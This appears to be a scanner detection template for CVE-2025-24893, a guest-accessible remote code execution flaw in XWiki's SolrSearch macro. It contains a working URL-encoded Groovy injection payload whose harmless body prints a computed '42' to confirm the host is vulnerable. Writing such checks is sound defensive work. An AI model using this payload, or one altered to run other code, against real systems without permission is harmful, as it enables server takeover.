content:
id: CVE-2025-24893

info:
  name: XWiki SolrSearchMacros 远程代码执行漏洞
  author: Deans
  severity: high
  description: XWiki 平台是一个通用的 wiki 平台，为构建在其上的应用程序提供运行时服务。任何 guest 都可以通过对 'SolrSearch' 的请求来执行任意远程代码执行。这会影响整个 XWiki 安装的机密性、完整性和可用性。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 6c71e81bc439b7b49d58dd7daff3ddc5

http:
- raw:
  - |+
    @timeout: 30s
    GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync+async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello+from%22+%2B+%22+search+text%3A%22+%2B+%2823+%2B+19%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D+ HTTP/1.1
    Content-Type: application/json
    Host: {{Hostname}}


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - ello from search text:42
    condition: and
